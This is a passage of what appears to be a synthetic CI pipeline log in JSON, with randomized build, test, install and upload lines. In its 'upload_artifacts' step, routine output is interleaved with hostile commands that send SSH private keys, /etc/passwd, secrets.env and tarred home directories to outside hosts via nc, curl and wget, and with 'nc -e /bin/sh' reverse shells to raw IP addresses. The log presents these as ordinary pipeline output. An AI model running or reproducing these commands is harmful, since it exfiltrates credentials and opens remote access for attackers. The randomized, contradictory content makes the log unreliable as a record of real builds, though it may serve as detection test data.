(267ms)\nCache hit for key-3497\nCache hit for key-5243\nArtifact uploaded: build.tar.gz (50MB)\nStep 4/10: Building\n\u2713 build completed\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (30MB)\n\u2713 build completed\nCache hit for key-6889\nStep 7/10: Building\n\u2713 test completed\nCompiling src/utils.go...\nCache hit for key-6369\nStep 9/10: Building\nFAILED: test_auth_login\nInstalling axios@1.15.0\n  PASS: test_user_create (78ms)\n  PASS: test_api_health (247ms)\nCompiling src/main.py...\n  PASS: test_api_health (238ms)\n\u2713 lint completed\nCompiling src/app.ts...\n\u2713 lint completed\nCache hit for key-3155\nStep 4/10: Building\n\u2713 lint completed\nWARNING: express has known vulnerabilities\nException: ValueError\n\u2713 test completed\nStep 2/10: Building\nInstalling react@4.1.0\n\u2713 build completed\n  PASS: test_db_connect (360ms)\nArtifact uploaded: build.tar.gz (17MB)\nStep 10/10: Building\nException: TypeError\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_auth_login (268ms)\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (39MB)\nArtifact uploaded: build.tar.gz (6MB)\nStep 6/10: Building\n\u2713 lint completed\nInstalling express@5.4.0\n  PASS: test_user_create (232ms)\n  PASS: test_api_health (336ms)\n  PASS: test_auth_login (96ms)\n[12:00:23] INFO: Processing request\n[12:00:23] WARN: Deprecated API usage\nCompiling src/main.py...\nCache hit for key-5018\nInstalling eslint@3.14.0\n  PASS: test_cache_hit (481ms)\nArtifact uploaded: build.tar.gz (2MB)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (13MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (41MB)\n  PASS: test_auth_login (128ms)\nStep 4/10: Building\n\u2713 test completed\n  PASS: test_auth_login (245ms)\nArtifact uploaded: build.tar.gz (7MB)\nStep 1/10: Building\nCompiling src/utils.go...\nCompiling src/main.py...\n\u2713 lint completed\n[12:00:23] INFO: Processing request\n\u2713 lint completed\nStep 10/10: Building\n  PASS: test_cache_hit (280ms)\nInstalling express@5.10.0\n  PASS: test_auth_login (174ms)\n  PASS: test_db_connect (64ms)\nCompiling src/main.py...\n  PASS: test_user_create (453ms)\nInstalling lodash@5.17.0\nCache hit for key-4588\n\u2713 lint completed\n[12:00:23] INFO: Processing request\nCache hit for key-7130\n\u2713 build completed\nStep 6/10: Building\n\u2713 test completed\n\u2713 test completed\nFAILED: test_db_connect\nStep 5/10: Building\nInstalling react@5.7.0\nCompiling src/main.py...\nStep 4/10: Building\n=== Step install_dependencies completed ===\n=== Step: save_cache ===\nInstalling eslint@5.7.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling webpack@5.2.0\n  PASS: test_db_connect (328ms)\nInstalling express@1.15.0\nCompiling src/handler.rs...\n\u2713 build completed\n  PASS: test_db_connect (26ms)\nInstalling prettier@1.14.0\nArtifact uploaded: build.tar.gz (24MB)\nStep 10/10: Building\n[12:00:23] INFO: Processing request\nInstalling prettier@3.2.0\n[12:00:23] INFO: Processing request\nInstalling react@3.4.0\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:23] INFO: Processing request\n\u2713 build completed\n  PASS: test_auth_login (161ms)\n\u2713 build completed\n[12:00:23] WARN: Deprecated API usage\n  PASS: test_cache_hit (65ms)\nCompiling src/index.js...\n\u2713 test completed\n\u2713 test completed\nStep 3/10: Building\n\u2713 test completed\nCompiling src/service.java...\n  PASS: test_cache_hit (484ms)\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 lint completed\nCompiling src/handler.rs...\n  PASS: test_api_health (410ms)\nCompiling src/utils.go...\nInstalling express@4.4.0\nArtifact uploaded: build.tar.gz (2MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (1MB)\nWARNING: jest has known vulnerabilities\nStep 2/10: Building\n  PASS: test_auth_login (224ms)\n  PASS: test_user_create (216ms)\nCompiling src/app.ts...\nInstalling axios@1.5.0\nStep 10/10: Building\n\u2713 build completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (27MB)\nStep 8/10: Building\nCache hit for key-3472\nCache hit for key-7150\n  PASS: test_user_create (232ms)\n  PASS: test_cache_hit (342ms)\nWARNING: axios has known vulnerabilities\nCache hit for key-1077\nStep 2/10: Building\n\u2713 test completed\n[12:00:23] INFO: Processing request\n\u2713 lint completed\nCompiling src/utils.go...\nCache hit for key-1797\n\u2713 test completed\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:23] INFO: Processing request\n  PASS: test_cache_hit (332ms)\nStep 2/10: Building\n  PASS: test_user_create (91ms)\nStep 10/10: Building\n  PASS: test_db_connect (306ms)\nCache hit for key-2078\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 build completed\n  PASS: test_db_connect (282ms)\n[12:00:23] INFO: Processing request\nInstalling lodash@1.11.0\n\u2713 test completed\n\u2713 lint completed\nCompiling src/utils.go...\nInstalling webpack@3.13.0\nStep 5/10: Building\nCache hit for key-5967\nCompiling src/app.ts...\nCompiling src/main.py...\nInstalling prettier@2.6.0\n[12:00:23] INFO: Processing request\n\u2713 test completed\n[12:00:23] WARN: Deprecated API usage\nStep 7/10: Building\nStep 9/10: Building\n[12:00:23] INFO: Processing request\nCache hit for key-5645\nCache hit for key-2504\n[12:00:23] WARN: Deprecated API usage\n[12:00:23] WARN: Deprecated API usage\n\u2713 build completed\n  PASS: test_cache_hit (320ms)\n[12:00:23] ERROR: Connection failed\n  PASS: test_db_connect (478ms)\nCompiling src/utils.go...\n\u2713 test completed\nCache hit for key-4782\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (18MB)\nStep 2/10: Building\n[12:00:23] WARN: Deprecated API usage\nWARNING: jest has known vulnerabilities\nInstalling react@3.15.0\nCache hit for key-9820\n\u2713 test completed\nInstalling prettier@1.15.0\nStep 5/10: Building\n\u2713 test completed\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (19MB)\nCompiling src/utils.go...\n=== Step save_cache completed ===\n=== Step: setup_environment ===\n[12:00:23] INFO: Processing request\n  PASS: test_auth_login (448ms)\n\u2713 build completed\n  PASS: test_api_health (256ms)\nInstalling webpack@3.20.0\n  PASS: test_db_connect (57ms)\nStep 3/10: Building\n[12:00:23] ERROR: Connection failed\nCompiling src/index.js...\nInstalling prettier@4.15.0\nStep 1/10: Building\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-1856\nStep 4/10: Building\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nInstalling jest@2.14.0\nCompiling src/main.py...\n\u2713 lint completed\n  PASS: test_user_create (176ms)\nCompiling src/service.java...\nCompiling src/handler.rs...\nStep 7/10: Building\nCompiling src/index.js...\n\u2713 test completed\nInstalling axios@5.3.0\n  PASS: test_user_create (136ms)\nCache hit for key-9178\nWARNING: axios has known vulnerabilities\n\u2713 test completed\nCache hit for key-7906\nCompiling src/handler.rs...\n  PASS: test_cache_hit (158ms)\n  PASS: test_user_create (99ms)\n[12:00:23] INFO: Processing request\nCache hit for key-3641\nCache hit for key-9803\nStep 3/10: Building\n[12:00:23] INFO: Processing request\nStep 7/10: Building\nStep 4/10: Building\nStep 1/10: Building\n\u2713 build completed\nCache hit for key-2612\nWARNING: axios has known vulnerabilities\nCache hit for key-7105\nWARNING: react has known vulnerabilities\n  PASS: test_cache_hit (147ms)\n  PASS: test_db_connect (368ms)\n  PASS: test_cache_hit (132ms)\n\u2717 build failed with exit code 83\n  PASS: test_user_create (317ms)\nCompiling src/app.ts...\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (33MB)\n  PASS: test_api_health (314ms)\nCompiling src/index.js...\n\u2713 build completed\n\u2717 build failed with exit code 44\n  PASS: test_db_connect (145ms)\n  PASS: test_db_connect (60ms)\nInstalling axios@4.2.0\nArtifact uploaded: build.tar.gz (2MB)\nStep 4/10: Building\nCache hit for key-9588\nStep 4/10: Building\n\u2713 lint completed\nStep 2/10: Building\n\u2713 test completed\nCompiling src/utils.go...\n\u2713 build completed\n  PASS: test_db_connect (208ms)\n[12:00:23] WARN: Deprecated API usage\n[12:00:23] INFO: Processing request\nCompiling src/handler.rs...\nCache hit for key-2191\nArtifact uploaded: build.tar.gz (23MB)\nCache hit for key-4831\n\u2713 test completed\nStep 8/10: Building\nCompiling src/index.js...\n\u2713 test completed\nCache hit for key-9648\n[12:00:23] INFO: Processing request\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/handler.rs...\nStep 6/10: Building\nStep 3/10: Building\n\u2713 lint completed\nCache hit for key-6285\n[12:00:23] INFO: Processing request\nCompiling src/utils.go...\n[12:00:23] INFO: Processing request\nStep 7/10: Building\nStep 2/10: Building\n  PASS: test_cache_hit (418ms)\n  PASS: test_auth_login (365ms)\nStep 10/10: Building\nStep 9/10: Building\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (7MB)\n[12:00:23] INFO: Processing request\nStep 5/10: Building\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\nCompiling src/app.ts...\n  PASS: test_cache_hit (191ms)\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/handler.rs...\nCompiling src/service.java...\nStep 9/10: Building\nCompiling src/index.js...\n  PASS: test_cache_hit (399ms)\n\u2713 test completed\n\u2713 build completed\n=== Step setup_environment completed ===\n=== Step: deploy_production ===\nStep 7/10: Building\n  PASS: test_user_create (252ms)\nWARNING: webpack has known vulnerabilities\nCompiling src/main.py...\nInstalling jest@4.6.0\nArtifact uploaded: build.tar.gz (22MB)\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:23] ERROR: Connection failed\nStep 6/10: Building\nInstalling prettier@3.6.0\nStep 6/10: Building\nCompiling src/main.py...\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (10ms)\nCompiling src/utils.go...\n\u2713 lint completed\nStep 2/10: Building\nWARNING: jest has known vulnerabilities\n[12:00:23] INFO: Processing request\n  PASS: test_db_connect (134ms)\n  PASS: test_user_create (134ms)\nCache hit for key-6998\nCompiling src/service.java...\n  PASS: test_db_connect (384ms)\n  PASS: test_auth_login (376ms)\nArtifact uploaded: build.tar.gz (32MB)\nStep 5/10: Building\n  PASS: test_user_create (86ms)\nException: TypeError\n\u2713 test completed\nCache hit for key-2765\n[12:00:23] INFO: Processing request\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling prettier@3.10.0\n\u2713 lint completed\n[12:00:23] INFO: Processing request\n\u2713 test completed\n  PASS: test_user_create (467ms)\n  PASS: test_db_connect (446ms)\nArtifact uploaded: build.tar.gz (20MB)\n\u2713 test completed\n\u2713 lint completed\nException: NullPointerException\nArtifact uploaded: build.tar.gz (43MB)\nStep 10/10: Building\n\u2713 test completed\n[12:00:23] INFO: Processing request\nWARNING: express has known vulnerabilities\nCache hit for key-5044\n\u2713 build completed\nArtifact uploaded: build.tar.gz (9MB)\nCompiling src/utils.go...\nWARNING: express has known vulnerabilities\n[12:00:23] INFO: Processing request\nCache hit for key-6219\nInstalling eslint@5.16.0\nStep 1/10: Building\nInstalling lodash@3.6.0\nCompiling src/main.py...\n[12:00:23] INFO: Processing request\nInstalling webpack@3.13.0\nCompiling src/handler.rs...\n[12:00:23] ERROR: Connection failed\n  PASS: test_cache_hit (157ms)\nArtifact uploaded: build.tar.gz (39MB)\nFAILED: test_cache_hit\n[12:00:23] INFO: Processing request\nInstalling prettier@5.19.0\nStep 4/10: Building\n  PASS: test_api_health (163ms)\nCache hit for key-7491\n\u2713 test completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (34MB)\nInstalling axios@3.18.0\n\u2713 build completed\n\u2713 build completed\nInstalling jest@3.14.0\n  PASS: test_auth_login (358ms)\nCache hit for key-6744\n  PASS: test_db_connect (341ms)\nStep 8/10: Building\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: build.tar.gz (45MB)\nCompiling src/service.java...\nInstalling axios@4.10.0\n\u2713 test completed\n\u2713 lint completed\n  PASS: test_db_connect (208ms)\n  PASS: test_cache_hit (487ms)\nInstalling react@2.13.0\n  PASS: test_cache_hit (79ms)\n\u2713 test completed\nCache hit for key-2201\nCompiling src/service.java...\n[12:00:23] INFO: Processing request\nCompiling src/main.py...\n\u2713 lint completed\n  PASS: test_user_create (192ms)\n[12:00:23] WARN: Deprecated API usage\n[12:00:23] INFO: Processing request\nStep 9/10: Building\nInstalling prettier@2.10.0\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\n\u2713 build completed\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:23] INFO: Processing request\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (34MB)\n=== Step deploy_production completed ===\n=== Step: integration_tests ===\nStep 8/10: Building\nCache hit for key-6318\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 build completed\nInstalling prettier@1.16.0\nStep 7/10: Building\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 8/10: Building\nStep 9/10: Building\nStep 3/10: Building\n  PASS: test_user_create (63ms)\nCompiling src/main.py...\nStep 2/10: Building\n  PASS: test_cache_hit (194ms)\nCompiling src/app.ts...\n\u2713 build completed\n\u2717 build failed with exit code 48\nStep 3/10: Building\nInstalling lodash@3.10.0\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (27MB)\nInstalling prettier@3.20.0\n[12:00:23] INFO: Processing request\n  PASS: test_auth_login (339ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_cache_hit (55ms)\nInstalling express@1.15.0\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-2844\nCompiling src/handler.rs...\nInstalling lodash@5.12.0\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nStep 4/10: Building\n\u2713 test completed\n[12:00:23] WARN: Deprecated API usage\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (29ms)\nCache hit for key-2750\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/app.ts...\nCache hit for key-3282\nCache hit for key-6986\nInstalling eslint@5.16.0\nCompiling src/main.py...\n[12:00:23] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-8418\nStep 3/10: Building\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:23] INFO: Processing request\nStep 3/10: Building\nCache hit for key-2207\n\u2717 build failed with exit code 53\n  PASS: test_auth_login (176ms)\n\u2713 build completed\n[12:00:23] WARN: Deprecated API usage\nCache hit for key-7398\nCompiling src/app.ts...\n[12:00:23] INFO: Processing request\nCompiling src/utils.go...\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\nException: NullPointerException\nCompiling src/service.java...\nCache hit for key-1611\n[12:00:23] WARN: Deprecated API usage\nStep 2/10: Building\nStep 10/10: Building\nInstalling prettier@1.19.0\nWARNING: prettier has known vulnerabilities\nCache hit for key-8670\nCache hit for key-5219\nStep 4/10: Building\n[12:00:23] INFO: Processing request\nCache hit for key-8920\n\u2713 build completed\n  PASS: test_auth_login (30ms)\nArtifact uploaded: build.tar.gz (33MB)\nStep 4/10: Building\nCompiling src/app.ts...\nCache hit for key-1079\n\u2713 build completed\nCache hit for key-8865\nStep 1/10: Building\n[12:00:23] INFO: Processing request\nCache hit for key-8789\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (321ms)\n  PASS: test_auth_login (95ms)\nCompiling src/service.java...\n\u2713 lint completed\n[12:00:23] INFO: Processing request\nInstalling prettier@4.18.0\nInstalling webpack@4.16.0\nStep 1/10: Building\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (17MB)\n[12:00:23] INFO: Processing request\nInstalling eslint@2.12.0\nFAILED: test_auth_login\nInstalling webpack@2.18.0\nCompiling src/index.js...\nInstalling lodash@2.12.0\nStep 9/10: Building\nInstalling prettier@2.5.0\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n=== Step integration_tests completed ===\n=== Step: upload_artifacts ===\nStep 5/10: Building\n  PASS: test_cache_hit (340ms)\nSending 352MB of data to test.io\nArtifact uploaded: build.tar.gz (44MB)\nCompiling src/index.js...\nCompiling src/index.js...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 203.172.129.217 45149\nStep 10/10: Building\n[12:00:23] INFO: Processing request\necho $(cat ~/.ssh/id_rsa) | base64 | nc 143.85.144.45 64566\n  PASS: test_user_create (318ms)\nCompiling src/utils.go...\n  PASS: test_auth_login (165ms)\nStep 3/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (26MB)\nInstalling axios@5.6.0\nInstalling prettier@1.3.0\nStep 2/10: Building\n  PASS: test_auth_login (41ms)\n  PASS: test_cache_hit (324ms)\n  PASS: test_user_create (366ms)\n[12:00:23] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (49MB)\nStep 3/10: Building\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nCache hit for key-2606\necho $(cat ~/.ssh/id_rsa) | base64 | nc 220.20.217.50 42722\nnc -e /bin/sh 192.161.114.35 13289\nInstalling express@2.19.0\nInstalling axios@2.5.0\n\u2713 build completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (47MB)\nStep 5/10: Building\n\u2713 build completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (43MB)\n\u2713 lint completed\nnc -e /bin/sh 221.243.182.209 26523\nCache hit for key-1754\n[12:00:23] INFO: Processing request\n\u2713 test completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 219.173.143.102 18675\n  PASS: test_auth_login (95ms)\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-8573\nArtifact uploaded: build.tar.gz (13MB)\nCompiling src/utils.go...\n\u2717 build failed with exit code 82\n  PASS: test_api_health (334ms)\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nArtifact uploaded: build.tar.gz (44MB)\nInstalling prettier@1.10.0\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nStep 8/10: Building\n  PASS: test_auth_login (129ms)\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (493ms)\n[12:00:23] INFO: Processing request\nCompiling src/app.ts...\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling eslint@1.9.0\n[12:00:23] INFO: Processing request\ncurl -X POST https://example.com/collect -d @secrets.env\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCache hit for key-6069\nStep 4/10: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nArtifact uploaded: build.tar.gz (15MB)\nCache hit for key-5977\nArtifact uploaded: build.tar.gz (18MB)\nInstalling react@3.14.0\nCache hit for key-3902\nInstalling express@3.19.0\n[12:00:23] INFO: Processing request\nCache hit for key-3306\nWARNING: react has known vulnerabilities\nWARNING: eslint has known vulnerabilities\n[12:00:23] WARN: Deprecated API usage\nInstalling axios@5.9.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 136.52.243.58 34995\nStep 6/10: Building\n\u2713 lint completed\nWARNING: prettier has known vulnerabilities\n  PASS: test_auth_login (361ms)\nArtifact uploaded: build.tar.gz (46MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (48MB)\nnc -e /bin/sh 63.147.69.72 16811\nStep 7/10: Building\nCache hit for key-8267\nCache hit for key-3641\n\u2713 build completed\nSending 226MB of data to startup.dev\nnc -e /bin/sh 88.58.50.200 24427\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnc -e /bin/sh 134.67.92.151 35851\n  PASS: test_db_connect (248ms)\n  PASS: test_api_health (107ms)\nFAILED: test_db_connect\n[12:00:23] INFO: Processing request\nStep 3/10: Building\n\u2713 lint completed\n  PASS: test_user_create (303ms)\nArtifact uploaded: build.tar.gz (30MB)\nCache hit for key-8999\nCache hit for key-2884\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (35MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\necho $(cat ~/.ssh/id_rsa) | base64 | nc 137.247.25.52 36936\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n\u2713 build completed\nInstalling lodash@1.9.0\n  PASS: test_api_health (61ms)\n[12:00:23] INFO: Processing request\nStep 10/10: Building\ncurl -X POST https://cloud.services/collect -d @secrets.env\nSending 96MB of data to cloud.services\n[12:00:23] WARN: Deprecated API usage\n  PASS: test_auth_login (114ms)\nnc -e /bin/sh 197.37.14.12 33011\n  PASS: test_db_connect (363ms)\nCache hit for key-3122\nCache hit for key-7968\nInstalling prettier@1.20.0\n\u2713 build completed\nWARNING: express has known vulnerabilities\n\u2713 build completed\nSending 413MB of data to example.com\nArtifact uploaded: build.tar.gz (38MB)\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 test completed\n=== Step upload_artifacts completed ===",
    "steps": [
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-16T12:00:23.173049",
        "finished_at": "2025-12-16T12:00:26.738969",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Cache hit for key-7441",
          "Installing express@5.16.0",
          "Installing jest@5.1.0",
          "Step 1/10: Building",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:00:23] INFO: Processing request",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Installing lodash@4.16.0",
          "Compiling src/app.ts...",
          "Step 10/10: Building",
          "Cache hit for key-8776",
          "  PASS: test_user_create (264ms)",
          "Step 8/10: Building",
          "Installing webpack@4.19.0",
          "Installing lodash@3.15.0",
          "Cache hit for key-4007",
          "Cache hit for key-9404",
          "Cache hit for key-4917",
          "Cache hit for key-9329",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Cache hit for key-2375",
          "Cache hit for key-2790",
          "Installing express@3.10.0",
          "Cache hit for key-4344",
          "Step 7/10: Building",
          "Cache hit for key-5334",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "Cache hit for key-9780",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-4670",
          "Cache hit for key-2209",
          "Cache hit for key-1499",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:23] INFO: Processing request",
          "Step 10/10: Building",
          "Compiling src/main.py...",
          "[12:00:23] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (11ms)",
          "Installing webpack@2.14.0",
          "Cache hit for key-1606",
          "Step 5/10: Building",
          "[12:00:23] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "[12:00:23] WARN: Deprecated API usage",
          "  PASS: test_auth_login (85ms)",
          "Cache hit for key-5531",
          "Cache hit for key-2825",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (48ms)",
          "  PASS: test_auth_login (370ms)",
          "Compiling src/utils.go...",
          "Installing express@4.5.0",
          "Installing lodash@1.9.0",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Step 10/10: Building",
          "  PASS: test_auth_login (445ms)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing react@3.11.0",
          "[12:00:23] INFO: Processing request",
          "Step 3/10: Building",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-2534",
          "FAILED: test_user_create",
          "Cache hit for key-6444",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Cache hit for key-3054",
          "Installing lodash@4.10.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:23] INFO: Processing request",
          "Step 3/10: Building",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Step 8/10: Building",
          "Installing express@5.8.0",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Step 5/10: Building",
          "Installing webpack@5.14.0",
          "Step 7/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (33ms)",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Compiling src/index.js...",
          "WARNING: lodash has known vulnerabilities",
          "Step 9/10: Building",
          "[12:00:23] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "  PASS: test_api_health (265ms)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Installing lodash@5.19.0",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-1683",
          "Installing express@2.9.0",
          "Compiling src/index.js...",
          "Step 9/10: Building",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-16T12:00:26.738969",
        "finished_at": "2025-12-16T12:00:30.304889",
        "log_lines": [
          "=== Step: setup_node ===",
          "Cache hit for key-5236",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (104ms)",
          "  PASS: test_cache_hit (257ms)",
          "Cache hit for key-7229",
          "Compiling src/service.java...",
          "Step 10/10: Building",
          "Step 10/10: Building",
          "[12:00:23] INFO: Processing request",
          "Step 5/10: Building",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:23] INFO: Processing request",
          "Installing express@5.4.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 5/10: Building",
          "Step 3/10: Building",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Compiling src/service.java...",
          "Installing lodash@1.10.0",
          "  PASS: test_db_connect (69ms)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Cache hit for key-3241",
          "Installing axios@3.14.0",
          "[12:00:23] INFO: Processing request",
          "Installing jest@3.11.0",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "[12:00:23] INFO: Processing request",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "\u2713 lint completed",
          "Installing jest@2.16.0",
          "[12:00:23] INFO: Processing request",
          "\u2717 build failed with exit code 38",
          "Step 10/10: Building",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 10/10: Building",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:23] INFO: Processing request",
          "Installing axios@2.10.0",
          "Step 10/10: Building",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "  PASS: test_user_create (179ms)",
          "Cache hit for key-5524",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] WARN: Deprecated API usage",
          "Cache hit for key-6747",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_auth_login (315ms)",
          "\u2713 lint completed",
          "Installing lodash@2.19.0",
          "Installing lodash@5.19.0",
          "Cache hit for key-7648",
          "\u2713 lint completed",
          "  PASS: test_api_health (299ms)",
          "Installing express@2.10.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing axios@3.9.0",
          "  PASS: test_auth_login (453ms)",
          "[12:00:23] INFO: Processing request",
          "Installing prettier@5.18.0",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "  PASS: test_user_create (15ms)",
          "Compiling src/utils.go...",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 4/10: Building",
          "Exception: RuntimeError",
          "Installing eslint@3.13.0",
          "Installing jest@2.7.0",
          "Cache hit for key-2225",
          "Cache hit for key-5640",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "Installing jest@2.6.0",
          "Installing express@2.18.0",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (4ms)",
          "Cache hit for key-3355",
          "\u2713 lint completed",
          "Installing eslint@2.3.0",
          "\u2713 build completed",
          "  PASS: test_cache_hit (412ms)",
          "Compiling src/handler.rs...",
          "\u2717 build failed with exit code 64",
          "Installing react@1.11.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-6322",
          "\u2717 build failed with exit code 60",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/index.js...",
